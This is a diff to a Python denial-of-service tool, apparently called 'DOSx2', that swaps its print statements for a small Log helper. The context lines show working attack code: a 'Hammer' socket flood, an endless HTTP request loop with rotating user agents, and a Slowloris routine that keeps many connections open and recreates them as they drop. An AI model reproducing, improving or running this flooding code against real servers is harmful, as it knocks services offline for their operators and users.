@@ -65,9 +65,9 @@ class FontColors:
 
 class Log:
     
-    error = lambda text: f"{FontColors.blue([time.ctime()])} {FontColors.red(text)}"
-    warning = lambda text: f"{FontColors.blue([time.ctime()])} {FontColors.yellow(text)}"
-    ok = lambda text: f"{FontColors.blue([time.ctime()])} {FontColors.green(text)}"
+    error = lambda text: print(f"{FontColors.blue([time.ctime()])} {FontColors.red(text)}")
+    warning = lambda text: print(f"{FontColors.blue([time.ctime()])} {FontColors.yellow(text)}")
+    ok = lambda text: print(f"{FontColors.blue([time.ctime()])} {FontColors.green(text)}")
     
 
 class DefaultHttpParameters:
@@ -166,12 +166,13 @@ class Hammer:
                 h_socket.connect((self.server, self.port))
                 if h_socket.sendto(packet, (self.server, self.port)):
                     h_socket.shutdown(1)
-                    print(f"{FontColors.blue(time.ctime())}", FontColors.green("<< Hammering Pcket Send << endl"))
+                    Log.ok("Hammering Pcket Send")
+                    # print(f"{FontColors.blue(time.ctime())}", FontColors.green("<< Hammering Pcket Send << endl"))
                 else:
                     h_socket.shutdown(1)
                 time.sleep(.1)
         except socket.error as e:
-            print(FontColors.red("not connection! server maybe down"))
+            Log.error("not connection! server maybe down")
             time.sleep(.1)
     
     def create_packet(self) -> str:
@@ -206,7 +207,7 @@ class Hammer:
             while True:
                 urllib.request.urlopen(urllib.request.Request(url, \
                 headers={'User-Agent': choice(DefaultHttpParameters.Headers.user_agents)}))
-                print(FontColors.blue("bot is hammering :0"))
+                Log.ok("bot is hammering :0")
                 time.sleep(.1)
         except:
             time.sleep(.1)
@@ -214,8 +215,8 @@ class Hammer:
     def run(self):
         """Run Attacks"""
         
-        print(FontColors.green(f"host: {self.server} port: {self.port} turbo: {self.turbo}"))
-        print(FontColors.yellow("Hammer Attack will start 5 second later ..."))
+        # print(FontColors.green(f"host: {self.server} port: {self.port} turbo: {self.turbo}"))
+        # print(FontColors.yellow("Hammer Attack will start 5 second later ..."))
         time.sleep(socket_count//10*2)
 
         while True:
@@ -295,7 +296,7 @@ class Slowloris:
         
         list_of_sockets = []
         
-        print(FontColors.yellow("Slowloris Is Here :) "), FontColors.green("Creating sockets..."))
+        # print(FontColors.yellow("Slowloris Is Here :) "), FontColors.green("Creating sockets..."))
         
         for _ in range(self.socket_count):
             try:
@@ -308,8 +309,7 @@ class Slowloris:
             
             thread_lock.acquire()               
             
-            print(FontColors.blue(time.ctime()), \
-            FontColors.green(f"Sending keep-alive headers... Socket count: {len(list_of_sockets)}"))
+            Log.ok(f"Slowloris Sending keep-alive headers... Socket count: {len(list_of_sockets)}")
             
             thread_lock.release()
 
@@ -320,7 +320,7 @@ class Slowloris:
                     list_of_sockets.remove(s)
             
             for _ in range(self.socket_count - len(list_of_sockets)):
-                print(FontColors.yellow("Recreating sockets..."))
+                Log.warning("Recreating sockets...")
                 try:
                     a_socket = self.create_socket()
                     if a_socket:
@@ -349,7 +349,7 @@ def check_connection(host: str, port: int):
             h_socket.connect((host, port))
             h_socket.settimeout(1)
         except Exception as err:
-            print(FontColors.red(err.args[1]))
+            Log.error(err.args[1])
             sys.exit(err.args[0])
 
 
@@ -382,7 +382,7 @@ if __name__ == "__main__":
     try:
         main()
     except (KeyboardInterrupt, SystemExit):
-        print(FontColors.blue(time.ctime()), FontColors.yellow("Stopping DOSx2"))
+        Log.warning("Stopping DOSx2")
         sys.exit(0)
     
 
